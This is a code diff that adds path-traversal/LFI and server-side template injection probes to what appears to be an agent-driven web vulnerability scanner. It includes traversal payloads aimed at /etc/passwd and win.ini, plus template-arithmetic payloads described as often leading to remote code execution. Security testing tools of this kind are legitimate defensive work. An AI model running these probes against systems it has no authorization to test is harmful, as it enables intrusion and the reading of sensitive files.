@@ -76,6 +76,16 @@ TOOLS_SCHEMA = [
         "parameters": {"url": "string (URL with query parameters)"},
     },
     {
+        "name": "lfi_probe",
+        "description": "Test path traversal / Local File Inclusion: injects ../ traversal sequences (various depths/encodings) to read sensitive files like /etc/passwd. Confirmed when the file's content is returned. Use on params taking a filename/path (file=, path=, page=, template=, ...).",
+        "parameters": {"url": "string (URL with query parameters)"},
+    },
+    {
+        "name": "ssti_probe",
+        "description": "Test SSTI (server-side template injection): injects arithmetic in template syntaxes ({{a*b}}, ${a*b}, #{a*b}, <%= %>); if the product renders, the engine evaluated input => SSTI/RCE. Reflection-proof. Use on params reflected into pages (name=, msg=, q=, ...).",
+        "parameters": {"url": "string (URL with query parameters)"},
+    },
+    {
         "name": "ssl_audit",
         "description": "SSL/TLS audit: certificate info, cipher suites, vulnerabilities",
         "parameters": {"host": "string"},
@@ -145,6 +155,8 @@ async def run_tool(name: str, params: dict) -> dict:
         "idor_probe": _idor_probe,
         "ssrf_probe": _ssrf_probe,
         "cmdi_probe": _cmdi_probe,
+        "lfi_probe": _lfi_probe,
+        "ssti_probe": _ssti_probe,
         "http_probe": _http_probe,
         "ssl_audit": _ssl_audit,
         "sqlmap_check": _sqlmap_check,
@@ -652,6 +664,108 @@ async def _dom_xss_probe(url: str) -> dict:
         "findings": findings,
         "note": "DOM XSS via headless browser — payload executed and set a window flag.",
     }
+
+
+async def _lfi_probe(url: str) -> dict:
+    """Test path traversal / LFI: inject traversal sequences (several depths and
+    encodings) targeting a known sensitive file (/etc/passwd, Windows win.ini).
+    Confirmed when the file's signature appears in the response."""
+    import httpx
+    import re
+    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+    if not url.startswith("http"):
+        url = f"http://{url}"
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query, keep_blank_values=True)
+    if not qs:
+        return {"url": url, "vulnerable": False, "note": "No query parameters to test."}
+
+    trav = "../" * 8
+    payloads = [
+        trav + "etc/passwd", "/etc/passwd",
+        ("..%2f" * 8) + "etc%2fpasswd",
+        ("....//" * 8) + "etc/passwd",
+        trav + "windows/win.ini", "/windows/win.ini",
+    ]
+    sigs = [re.compile(r"root:.*?:0:0:"), re.compile(r"\[(fonts|extensions)\]", re.I)]
+    kw = ("file", "path", "page", "doc", "template", "include", "load", "dir",
+          "download", "view", "name", "img", "read", "filename")
+
+    findings = []
+    async with httpx.AsyncClient(timeout=8, follow_redirects=True, verify=False) as client:
+        params = sorted(qs, key=lambda k: 0 if any(w in k.lower() for w in kw) else 1)
+        for pname in params:
+            hit = False
+            for pl in payloads:
+                tp = {k: v[0] for k, v in qs.items()}
+                tp[pname] = pl
+                turl = urlunparse(parsed._replace(query=urlencode(tp, safe="%/.")))
+                try:
+                    body = (await client.get(turl)).text
+                    if any(s.search(body) for s in sigs):
+                        findings.append({"param": pname, "payload": pl,
+                                         "proof": "sensitive file content (e.g. /etc/passwd) returned"})
+                        hit = True
+                        break
+                except Exception:
+                    pass
+            if hit:
+                break
+
+    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
+            "tested_params": list(qs.keys()),
+            "note": "Path traversal / LFI: server returned a sensitive file's contents."}
+
+
+async def _ssti_probe(url: str) -> dict:
+    """Test SSTI (server-side template injection) via arithmetic across template
+    syntaxes ({{ }}, ${ }, #{ }, <%= %>). If the PRODUCT of two random numbers
+    renders in the response, the template engine evaluated our input => SSTI,
+    often RCE. Reflection-proof (echo shows the expression, not the product)."""
+    import httpx
+    import random
+    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+    if not url.startswith("http"):
+        url = f"http://{url}"
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query, keep_blank_values=True)
+    if not qs:
+        return {"url": url, "vulnerable": False, "note": "No query parameters to test."}
+
+    findings = []
+    async with httpx.AsyncClient(timeout=8, follow_redirects=True, verify=False) as client:
+        try:
+            baseline = (await client.get(url)).text
+        except Exception:
+            baseline = ""
+        for pname in qs:
+            a, b = random.randint(100000, 999999), random.randint(11, 97)
+            product = str(a * b)
+            tmpls = [
+                f"{{{{{a}*{b}}}}}",      # {{a*b}} Jinja2/Twig
+                f"${{{a}*{b}}}",         # ${a*b}  JSP/Spring EL
+                f"#{{{a}*{b}}}",         # #{a*b}  Ruby/Thymeleaf
+                f"<%= {a}*{b} %>",       # ERB
+                f"{{{a}*{b}}}",          # {a*b}
+            ]
+            for pl in tmpls:
+                tp = {k: v[0] for k, v in qs.items()}
+                tp[pname] = pl
+                turl = urlunparse(parsed._replace(query=urlencode(tp)))
+                try:
+                    body = (await client.get(turl)).text
+                    if product in body and product not in baseline:
+                        findings.append({"param": pname, "payload": pl,
+                                         "proof": f"template engine evaluated {a}*{b}={product}"})
+                        break
+                except Exception:
+                    pass
+
+    return {"url": url, "vulnerable": len(findings) > 0, "findings": findings,
+            "tested_params": list(qs.keys()),
+            "note": "SSTI confirmed via server-side template arithmetic. Often escalates to RCE."}
 
 
 async def _cmdi_probe(url: str) -> dict:
